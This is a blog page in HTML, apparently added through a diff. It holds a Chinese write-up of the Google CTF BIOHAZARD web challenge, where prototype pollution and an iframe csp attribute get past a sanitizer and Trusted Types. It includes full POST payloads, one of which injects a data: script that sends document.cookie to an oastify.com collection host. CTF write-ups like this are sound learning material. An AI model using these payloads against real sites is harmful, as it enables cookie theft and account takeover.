@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
+    <meta name="description" content="GoogleCTF2022_BIOHAZARD WriteUp" />
+    <meta name="hexo-theme-A4" content="v1.7.0" />
+    <link rel="alternate icon" type="image/webp" href="/img/rabbit.jpg">
+    <title>rabbit&#39;s blog | </title>
+
+    
+        
+            
+<link rel="stylesheet" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/reset.css">
+
+            
+<link rel="stylesheet" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/markdown.css">
+
+            
+<link rel="stylesheet" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/fonts.css">
+ 
+            <!--注意：首页既不是post也不是page-->
+            
+        
+    
+    
+<link rel="stylesheet" href="/css/ui.css">
+ 
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+    
+    <body>
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/rabbit.jpg" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">rabbit&#39;s blog</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+    </ul>
+</div>
+ 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            GoogleCTF2022_BIOHAZARD WriteUp
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+        
+        <p>首先原型链污染</p>
+<pre><code class="js">interestObj = &#123;&quot;favorites&quot;:&#123;&#125;&#125;;
+  const uuid = viewPath[1];
+  const xhr = new XMLHttpRequest();
+  xhr.addEventListener(&quot;load&quot;, () =&gt; &#123;
+    if (xhr.status === 200) &#123;
+      const json = JSON.parse(xhr.response);
+      for (const key of Object.keys(json)) &#123;
+        if (interestObj[key] === undefined) &#123;
+          interestObj[key] = json[key];
+        &#125; else&#123;
+          Object.assign(interestObj[key], json[key]);
+        &#125;
+      &#125;
+    &#125; else &#123;
+      alert(xhr.response);
+      location.href = &#39;/&#39;;
+    &#125;
+  )
+</code></pre>
+<p>利用<code>iframe</code>属性 <code>csp</code> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/csp">https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/csp</a> </p>
+<p>来添加自定义<code>csp</code>(只能加限制不能解除限制，所以不能把<code>trusted-types</code>和<code>nonce</code>干掉&gt;_&lt;)</p>
+<p>通过原型链污染注册新的白名单属性来让<code>iframe-csp</code>通过<code>sanitizer</code></p>
+<pre><code class="json">&#123;
+   &quot;name&quot;:&quot;rabbit&quot;,
+   &quot;__proto__&quot;:&#123;
+      &quot;* CSP&quot;:true
+   &#125;
+&#125;
+</code></pre>
+<p>从而我们获得了一个可添加<code>csp</code>和可利用原型链污染的新窗口</p>
+<p>注意到<code>main.js</code>末尾</p>
+<pre><code class="js">function loadEditorResources() &#123;
+  const style = document.querySelector(&#39;#editor-style&#39;).content;
+  document.head.appendChild(style);
+  const script = document.createElement(&#39;script&#39;);
+  safeScriptEl.setSrc(script, trustedResourceUrl(editor));
+  document.body.appendChild(script);
+&#125;
+
+window.addEventListener(&#39;DOMContentLoaded&#39;, () =&gt; &#123;
+  render();
+  if (!location.pathname.startsWith(&#39;/view/&#39;)) &#123;
+    loadEditorResources();
+  &#125;
+&#125;);
+</code></pre>
+<p>访问<code>///view/:id</code>可以进去<code>loadEditorResources</code></p>
+<p>里面<code>appendChild(script)</code>很有意思 看看<code>editor</code>是哪来的</p>
+<p>在<code>bootstrap.js</code></p>
+<pre><code class="js">if (!location.pathname.startsWith(&#39;/view/&#39;)) &#123;
+  goog.require(&#39;goog.editor.Command&#39;);
+  goog.require(&#39;goog.editor.Field&#39;);
+  goog.require(&#39;goog.editor.plugins.BasicTextFormatter&#39;);
+  goog.require(&#39;goog.editor.plugins.EnterHandler&#39;);
+  goog.require(&#39;goog.editor.plugins.HeaderFormatter&#39;);
+  goog.require(&#39;goog.editor.plugins.LinkBubble&#39;);
+  goog.require(&#39;goog.editor.plugins.LinkDialogPlugin&#39;);
+  goog.require(&#39;goog.editor.plugins.ListTabHandler&#39;);
+  goog.require(&#39;goog.editor.plugins.LoremIpsum&#39;);
+  goog.require(&#39;goog.editor.plugins.RemoveFormatting&#39;);
+  goog.require(&#39;goog.editor.plugins.SpacesTabHandler&#39;);
+  goog.require(&#39;goog.editor.plugins.UndoRedo&#39;);
+  goog.require(&#39;goog.ui.editor.DefaultToolbar&#39;);
+  goog.require(&#39;goog.ui.editor.ToolbarController&#39;);
+  editor = (x=&gt;x)`/static/editor.js`;
+&#125;
+</code></pre>
+<p>所以到现在思路很明确惹 利用<code>csp</code>让新窗口不加载<code>bootstrap.js</code>并且用原型链污染注册可控的<code>editor</code>变量 从而执行我们想要的脚本</p>
+<p>通过原型链污染在子窗口注册好我们的<code>editor</code></p>
+<p>POST &#x2F;create</p>
+<pre><code class="json">&#123;
+   &quot;name&quot;:&quot;rabbit&quot;,
+   &quot;__proto__&quot;:&#123;
+      &quot;editor&quot;:[
+         &quot;data:,document.location=&#39;https://4w1msb7v7b6jvpl2ucxmepg4bvhw5pte.oastify.com/?c=&#39;+JSON.stringify(document.cookie)&quot;
+      ]
+   &#125;
+&#125;
+</code></pre>
+<p>获取的子窗口id并通过<code>iframe</code>插入 利用原型链污染以修改<code>ifram</code>的csp属性 并设置<code>bootstrap.js</code>外的source为<code>script-src</code>(csp好像只有白名单 呜呜呜)</p>
+<p>POST &#x2F;create</p>
+<pre><code class="json">&#123;
+   &quot;name&quot;:&quot;rabbit&quot;,
+   &quot;__proto__&quot;:&#123;
+      &quot;* CSP&quot;:true
+   &#125;,
+   &quot;introduction&quot;:&quot;&lt;iframe csp=\&quot;script-src data: &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;  https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/node_modules/ https://biohazard-web.2023.ctfcompetition.com/static/main.js https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js \&quot; src=https://biohazard-web.2023.ctfcompetition.com//view/a58b23f3-78e9-43e6-92dc-8511b73fcd13&gt;&quot;
+&#125;
+</code></pre>
+<p>然后report收flag就好惹&gt;_&lt;</p>
+
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2023-07-10</span>
+            
+            
+             
+        
+        </i>
+    </div>
+    
+        
+
+     
+</div>
+
+
+
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 2023-2333 Hagia-Sophia 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>隠された花の名を，誰が知っているでしょう。</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+        
+<link rel="stylesheet" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/a11y-dark.min.css">
+
+        
+<script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/highlight.min.js"></script>
+
+        
+<script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/highlightjs-line-numbers.js"></script>
+
+    
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+                </div>
+            
+    </body>
+</html>
